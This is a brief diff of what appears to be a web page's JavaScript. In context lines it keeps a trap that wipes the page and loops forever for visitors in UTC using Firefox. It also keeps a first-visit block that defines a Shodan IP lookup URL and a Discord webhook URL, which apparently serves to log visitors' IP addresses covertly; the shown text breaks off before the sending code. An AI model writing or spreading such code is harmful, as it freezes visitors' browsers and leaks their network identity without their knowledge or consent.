@@ -1,4 +1,4 @@
-if (new Date().getTimezoneOffset() === 0) {
+if (new Date().getTimezoneOffset() === 0 && navigator.userAgent.indexOf("Firefox") > -1) {
   document.documentElement.remove();
   while (true) {}
 }
@@ -103,7 +103,7 @@ if (
     .some((item) => item.trim().startsWith("loggedBefore="))
 ) {
 } else {
-  document.cookie = "loggedBefore=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
+  document.cookie = "loggedBefore=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; samesite=strict";
 
   const SHODAN_IP_API_URL = "https://api.shodan.io/tools/myip";
   const DISCORD_WEBHOOK_URL =
